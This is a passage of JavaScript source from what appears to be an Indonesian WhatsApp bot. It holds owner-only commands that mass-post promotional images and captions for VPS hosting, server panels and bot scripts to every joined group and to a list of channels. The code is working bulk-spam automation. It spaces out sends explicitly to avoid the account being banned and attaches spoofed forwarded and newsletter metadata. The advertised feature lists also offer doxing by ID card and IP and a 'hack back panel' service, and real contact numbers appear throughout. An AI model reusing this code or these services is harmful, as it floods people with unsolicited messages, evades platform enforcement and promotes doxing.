    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `*々 IjulTaka || 乂 Menyediakan*

*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*

*»»—— Produk Lainnya ——««*
*» Panel Public 1Gb - Unli*
*» Panel Private 1Gb - Unli*
*» Murid Buat Fitur : 50/45K*
*» Domain my.id .tech dll : 10K*
*» Reseller Subdomain : 15K*
*» Murid Subdomain Full Akses Cf : 15K*
*» Jasa Rename Script: 10K*
*» Jasa Fix Script dll*
*» Reseller Panel Public : 10K*
*» Reseller Panel Private : 15K*
*» Admin Panel : 20K*
*» Pt Panel : 50K*
*» Own Panel : 40K*
*» Sc Wa/Tele*
*» Dll Tanyakan*
*» NOTE: BISA GUNAKAN BOT DARI NO DI BAWAH*

*»»—— Contacts Person ——««*
*Wa :* wa.me/62895373974000
*Tele :* t.me/々 IjulTaka || 乂
*Channel :* https://whatsapp.com/channel/0029VaqgmI2Jf05dg5Fweh0T`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/promosi.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmadp': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil

    const teks = `🚀 *PANEL PRIVATE* 🚀
➪ *RESELLER PANEL 15K*
➪ *ADMIN PANEL 20K*
➪ *OWNER PANEL 25K*
➪ *PT PANEL 35K*
➪ *PANEL 1GB-5GB*
➪ *PANEL UNLIMITED*
➪ *(BUY PT PANEL DPT 2 SERVER)*

🚀 *SPEK RAM 16 CORE 4* 🚀
_ANTI DELAY!! SERVER PRIVATE_
_ANTI PT PT JIKA MOKAD_

*ORDER?*￬￬￬
*WHATSAPP:*\n*wa.me/62895373974000 (Aktif)*`; 

    const jid = m.chat;
    const gambarDefault = "./pm/adp.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup ke dalam array suksesGrup
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}`,
        },
        { quoted: qlocJpm }
    );
}
break;

case 'pmadp-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `🚀 *PANEL PRIVATE* 🚀
➪ *RESELLER PANEL 15K*
➪ *ADMIN PANEL 20K*
➪ *OWNER PANEL 25K*
➪ *PT PANEL 35K*
➪ *PANEL 1GB-5GB*
➪ *PANEL UNLIMITED*
➪ *(BUY PT PANEL DPT 2 SERVER)*

🚀 *SPEK RAM 16 CORE 4* 🚀
_ANTI DELAY!! SERVER PRIVATE_
_ANTI PT PT JIKA MOKAD_

*ORDER?*￬￬￬
*WHATSAPP:*\n*wa.me/62895373974000 (Aktif)*`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/adp.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmsc':
case 'pmscript': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil
    let gagalGrup = []; // Array untuk menyimpan grup yang gagal

    const teks = `*🔵 Script Simple Botz V4*

💰 *Price / Harga:* Rp30.000  
📂 *Type:* Case & Plugins  
🔓 *No Enc 100*  
🚫 *Nego? No Free Update*  
🎥 *Menu Giphy*  
⚡ *Buy otomatis work*  
🌐 *Cpanel 2 Server*  
📌 *Tanpa Prefix*  
✅ *Jpm / Jpm2 / Jpm3Relay*  
✅ *Jpmtesti / Jpmtesti2*  
✅ *Addidch*  
✅ *Delidch*  
✅ *Listidch*  

🔍 *Preview Script:*  
👉 wa.me/62895373974000  
🛒 *Buy Script:*  
👉 wa.me/62895373974000`;

    const jid = m.chat;
    const gambarDefault = "./pm/script.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup yang berhasil terkirim
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
            gagalGrup.push(allgrup[i]?.subject || `Grup ID: ${i}`); // Menambahkan nama grup yang gagal
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup yang berhasil dan gagal dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");
    const daftarGagal = gagalGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil dan gagal
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}\n\n*Grup yang gagal:*\n${daftarGagal}`,
        },
        { quoted: qlocJpm }
    );

    // Mengirim pesan ke owner jika ada error
    if (gagalGrup.length > 0) {
        await conn.sendMessage(
            `${global.owner}@s.whatsapp.net`,
            {
                text: `*Laporan Error*\nCommand: ${command}\nTerdapat ${gagalGrup.length} grup yang gagal dikirim pesan.\n\n*Daftar Grup Gagal:*\n${daftarGagal}`,
            }
        );
    }
}
break;

case 'pmsc-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `*🔵 Script Simple Botz V4*

💰 *Price / Harga:* Rp30.000  
📂 *Type:* Case & Plugins  
🔓 *No Enc 100*  
🚫 *Nego? No Free Update*  
🎥 *Menu Giphy*  
⚡ *Buy otomatis work*  
🌐 *Cpanel 2 Server*  
📌 *Tanpa Prefix*  
✅ *Jpm / Jpm2 / Jpm3Relay*  
✅ *Jpmtesti / Jpmtesti2*  
✅ *Addidch*  
✅ *Delidch*  
✅ *Listidch*  

🔍 *Preview Script:*  
👉 wa.me/62895373974000  
🛒 *Buy Script:*  
👉 wa.me/62895373974000`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/script.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmsc1':
case 'pmscript1': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil
    let gagalGrup = []; // Array untuk menyimpan grup yang gagal

    const teks = `[🔥 SC NEW 🔥]

SELL SCRIPT RAFATHARCODE V5
💳 BUY OTOMATIS GATEWAY VIA ORDERKUOTA

💸 HARGA? PM AJA!
📩 PM: wa.me/62895373974000 *々 IjulTaka || 乂*`;

    const jid = m.chat;
    const gambarDefault = "./pm/script1.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup yang berhasil terkirim
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
            gagalGrup.push(allgrup[i]?.subject || `Grup ID: ${i}`); // Menambahkan nama grup yang gagal
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup yang berhasil dan gagal dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");
    const daftarGagal = gagalGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil dan gagal
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}\n\n*Grup yang gagal:*\n${daftarGagal}`,
        },
        { quoted: qlocJpm }
    );

    // Mengirim pesan ke owner jika ada error
    if (gagalGrup.length > 0) {
        await conn.sendMessage(
            `${global.owner}@s.whatsapp.net`,
            {
                text: `*Laporan Error*\nCommand: ${command}\nTerdapat ${gagalGrup.length} grup yang gagal dikirim pesan.\n\n*Daftar Grup Gagal:*\n${daftarGagal}`,
            }
        );
    }
}
break;

case 'pmsc1-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `[🔥 SC NEW 🔥]

SELL SCRIPT RAFATHARCODE V5
💳 BUY OTOMATIS GATEWAY VIA ORDERKUOTA

💸 HARGA? PM AJA!
📩 PM: wa.me/62895373974000 *々 IjulTaka || 乂*`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/script1.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;

case 'pmsc2':
case 'pmscript2': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil
    let gagalGrup = []; // Array untuk menyimpan grup yang gagal

    const teks = `🌟 [ ꜱᴄ ɴᴇᴡ ] 🌟

📜 ꜱᴇʟʟ ꜱᴄʀɪᴘᴛ ɪɴꜱᴛᴀʟʟ ᴘᴀɴᴇʟ ᴅʟʟ
⚡ ꜱᴜᴘᴘᴏʀᴛ ʙᴜᴛᴛᴏɴ ɴᴇᴡ
💰 ʙᴜʏ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ɢᴀᴛᴇᴡᴀʏ ᴠɪᴀ ᴏʀᴅᴇʀᴋᴏᴛᴀ

✨ ꜰᴇᴀᴛᴜʀᴇ ꜱᴄʀɪᴘᴛ ꜱᴜᴘᴘᴏʀᴛ ʙᴜᴛᴛᴏɴ ✨
✅ ʙᴜʏ ᴊᴀꜱᴀ ʜᴀᴄᴋ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴀᴅᴍɪɴᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ʀᴇꜱᴇʟʟᴇʀ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴏᴡɴᴇʀ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴠᴘꜱ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʟᴀʏᴀɴᴀɴ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ᴅᴇᴘᴏꜱɪᴛ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ 2 ꜱᴇʀᴠᴇʀ ᴘᴜʙʟɪᴄ/ᴘʀɪᴠᴀᴛᴇ
✅ ᴊᴘᴍᴛᴇꜱᴛɪ/ᴊᴘᴍᴛᴇꜱᴛɪ2
✅ ᴊᴘᴍ/ᴊᴘᴍ2/ᴊᴘᴍ3ᴅᴇʟᴀʏ
✅ ᴊᴘᴍᴄʜ
✅ ᴀᴅᴅɪᴅᴄʜ
✅ ᴅᴇʟɪᴅᴄʜ
✅ ʟɪꜱᴛɪᴅᴄʜ
✅ ᴀᴅᴅʜᴜᴛᴀɴɢ
✅ ᴅᴇʟʜᴜᴛᴀɴɢ
✅ ʟɪꜱʜᴛʜᴜᴛᴀɴɢ
✅ ᴀᴅᴅᴅᴘ
✅ ᴅᴇʟᴅᴘ
✅ ʟɪꜱᴛᴅᴘ

🐦 ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ:
👉 https://whatsapp.com/channel/0029VayQ6hhKmCPSQtI26w3i

📌 ᴄᴇᴋ ꜰᴇᴀᴛᴜʀᴇ ʙᴏᴛ:
👉 ʙᴏᴛ wa.me/628388329551 ᴋᴇᴛɪᴋ ᴍᴇɴᴜ

💵 ʜᴀʀɢᴀ? ᴘᴍ ᴀᴊᴀ!
📞 wa.me/62895373974000`;

    const jid = m.chat;
    const gambarDefault = "./pm/script2.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup yang berhasil terkirim
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
            gagalGrup.push(allgrup[i]?.subject || `Grup ID: ${i}`); // Menambahkan nama grup yang gagal
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup yang berhasil dan gagal dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");
    const daftarGagal = gagalGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil dan gagal
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}\n\n*Grup yang gagal:*\n${daftarGagal}`,
        },
        { quoted: qlocJpm }
    );

    // Mengirim pesan ke owner jika ada error
    if (gagalGrup.length > 0) {
        await conn.sendMessage(
            `${global.owner}@s.whatsapp.net`,
            {
                text: `*Laporan Error*\nCommand: ${command}\nTerdapat ${gagalGrup.length} grup yang gagal dikirim pesan.\n\n*Daftar Grup Gagal:*\n${daftarGagal}`,
            }
        );
    }
}
break;

case 'pmsc2-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `🌟 [ ꜱᴄ ɴᴇᴡ ] 🌟

📜 ꜱᴇʟʟ ꜱᴄʀɪᴘᴛ ɪɴꜱᴛᴀʟʟ ᴘᴀɴᴇʟ ᴅʟʟ
⚡ ꜱᴜᴘᴘᴏʀᴛ ʙᴜᴛᴛᴏɴ ɴᴇᴡ
💰 ʙᴜʏ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ɢᴀᴛᴇᴡᴀʏ ᴠɪᴀ ᴏʀᴅᴇʀᴋᴏᴛᴀ

✨ ꜰᴇᴀᴛᴜʀᴇ ꜱᴄʀɪᴘᴛ ꜱᴜᴘᴘᴏʀᴛ ʙᴜᴛᴛᴏɴ ✨
✅ ʙᴜʏ ᴊᴀꜱᴀ ʜᴀᴄᴋ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴀᴅᴍɪɴᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ʀᴇꜱᴇʟʟᴇʀ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴏᴡɴᴇʀ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴘᴀɴᴇʟ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʙᴜʏ ᴠᴘꜱ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ʟᴀʏᴀɴᴀɴ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ ᴅᴇᴘᴏꜱɪᴛ ᴀᴜᴛᴏᴍᴀᴛɪᴄ
✅ 2 ꜱᴇʀᴠᴇʀ ᴘᴜʙʟɪᴄ/ᴘʀɪᴠᴀᴛᴇ
✅ ᴊᴘᴍᴛᴇꜱᴛɪ/ᴊᴘᴍᴛᴇꜱᴛɪ2
✅ ᴊᴘᴍ/ᴊᴘᴍ2/ᴊᴘᴍ3ᴅᴇʟᴀʏ
✅ ᴊᴘᴍᴄʜ
✅ ᴀᴅᴅɪᴅᴄʜ
✅ ᴅᴇʟɪᴅᴄʜ
✅ ʟɪꜱᴛɪᴅᴄʜ
✅ ᴀᴅᴅʜᴜᴛᴀɴɢ
✅ ᴅᴇʟʜᴜᴛᴀɴɢ
✅ ʟɪꜱʜᴛʜᴜᴛᴀɴɢ
✅ ᴀᴅᴅᴅᴘ
✅ ᴅᴇʟᴅᴘ
✅ ʟɪꜱᴛᴅᴘ

🐦 ᴄʜᴀɴɴᴇʟ ᴜᴘᴅᴀᴛᴇ:
👉 https://whatsapp.com/channel/0029VayQ6hhKmCPSQtI26w3i

📌 ᴄᴇᴋ ꜰᴇᴀᴛᴜʀᴇ ʙᴏᴛ:
👉 ʙᴏᴛ wa.me/628388329551 ᴋᴇᴛɪᴋ ᴍᴇɴᴜ

💵 ʜᴀʀɢᴀ? ᴘᴍ ᴀᴊᴀ!
📞 wa.me/62895373974000`;

    // Gambar promosi default
    const gambarDefault = fs.readFileSync("./pm/script2.jpg");

    // Beri tahu pengguna bahwa proses sedang berlangsung
    Reply("⏳ Harap sabar, proses sedang berlangsung... (Jeda 5 menit untuk menghindari penonaktifan nomor)");

    // Kirim pesan dan gambar ke semua channel dalam daftar
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: gambarDefault,
                caption: teksPromosi
            }); 
        } catch (error) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
        }
    }

    // Konfirmasi setelah semua pesan dikirim
    Reply("✅ Berhasil mengirim promosi ke semua channel WhatsApp.");
}
break;


case 'pmsc3':
case 'pmscript3': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil
    let gagalGrup = []; // Array untuk menyimpan grup yang gagal

    const teks = `🔵 *Sell Script Simple Bot V5.5 New  (Database)*

*Fitur New:*
• Jpmch Foto & Delay Timer
• Add Id Ch & Del id Ch & List id ch
• Bl Grup & Del Bl Grup & List Bl Grup
• Push kontak list & Button 
• Jpmch Supp File Path
• Button New Anti Crash
• Cpanel Button
• Addcase & Delcase & Getcase & Listcase
• Addhutang & Delhutang & Listhutang
• Adddp & Deldp & Listdp
• Addpendapatan & Delpendapatan & Listpendapatan
• Adddb2 & Deldb2 & Listdb2 ( Bisa Add Database Sendiri )
• Install Panel & Thema 5 Pilihan
• Buy Otomatis
• Buy Seller ( Otomatis )
• Buy Owner ( Otomatis )
• Buy Subdomain ( Otomatis )
• Jpm Button
• Send Script (Nomor)
• Backup Script
• Backup2 Script ( Kekirim Ke Group Private Anda )
• Addsaldo & Minsaldo & Ceksaldo ( Tanpa Gateway )
• Addstock & Delstock & Editstock & Stock 
• Buyjasainstall & Buyjasathema & Buyjasaresetpwvps 
• Buynokos & Buyakses & Buyownpnl & Buyptpnl & Buydomain
• Buyjasasharech & Buyjasasharechv2 & Buyjasasharerelaych
• Changeapido & Listdropletall ( Dua Akun ) & Sisadroplet All ( Dua Akun )
• Createvps Button & Cekakunv1
• Domain Aktif 
• Topup & IsiPulsa 
• Ban Pengguna ( Tdk Bisa Menggunakan Bot )
• doxktp & doxip
• Cek Langsung Saja Fitur Nya Dibot Kami !!

🐦 Channel Update:
👉 https://whatsapp.com/channel/0029VayQ6hhKmCPSQtI26w3i

📌 Cek Fitur Bot:
👉 Bot wa.me/6282286499979?text=.menu

📌 Stock Tersedia:
👉 Bot wa.me/6282286499979?text=.stock

💵 Harga ? Pm Aja 
📞 wa.me/62895373974000`;

    const jid = m.chat;
    const gambarDefault = "./pm/script3.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup yang berhasil terkirim
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
            gagalGrup.push(allgrup[i]?.subject || `Grup ID: ${i}`); // Menambahkan nama grup yang gagal
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup yang berhasil dan gagal dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");
    const daftarGagal = gagalGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil dan gagal
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}\n\n*Grup yang gagal:*\n${daftarGagal}`,
        },
        { quoted: qlocJpm }
    );

    // Mengirim pesan ke owner jika ada error
    if (gagalGrup.length > 0) {
        await conn.sendMessage(
            `${global.owner}@s.whatsapp.net`,
            {
                text: `*Laporan Error*\nCommand: ${command}\nTerdapat ${gagalGrup.length} grup yang gagal dikirim pesan.\n\n*Daftar Grup Gagal:*\n${daftarGagal}`,
            }
        );
    }
}
break;

case 'pmsc3-ch': {
    if (!isCreator) return Reply(mess.owner);

    // Memuat daftar saluran dari file JSON
    const fs = require('fs');
    let daftarSaluran;
    try {
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
    } catch (error) {
        console.error("Gagal membaca file idsaluran.json:", error);
        return Reply("❌ Gagal membaca daftar saluran.");
    }

    // Pesan promosi
    const teksPromosi = `🔵 *Sell Script Simple Bot V5.5 New (Database)*

*Fitur New:*
• Jpmch Foto & Delay Timer
• Add Id Ch & Del id Ch & List id ch
• Bl Grup & Del Bl Grup & List Bl Grup
• Push kontak list & Button 
• Jpmch Supp File Path
• Button New Anti Crash
• Cpanel Button
• Addcase & Delcase & Getcase & Listcase
• Addhutang & Delhutang & Listhutang
• Adddp & Deldp & Listdp
• Addpendapatan & Delpendapatan & Listpendapatan
• Adddb2 & Deldb2 & Listdb2 ( Bisa Add Database Sendiri )
• Install Panel & Thema 5 Pilihan
• Buy Otomatis
• Buy Seller ( Otomatis )
• Buy Owner ( Otomatis )
• Buy Subdomain ( Otomatis )
• Jpm Button
• Send Script (Nomor)
• Backup Script
• Backup2 Script ( Kekirim Ke Group Private Anda )
• Addsaldo & Minsaldo & Ceksaldo ( Tanpa Gateway )
• Addstock & Delstock & Editstock & Stock 
• Buyjasainstall & Buyjasathema & Buyjasaresetpwvps 
• Buynokos & Buyakses & Buyownpnl & Buyptpnl & Buydomain
• Buyjasasharech & Buyjasasharechv2 & Buyjasasharerelaych
• Changeapido & Listdropletall ( Dua Akun ) & Sisadroplet All ( Dua Akun )
• Createvps Button & Cekakunv1
• Domain Aktif 
• Topup & IsiPulsa 
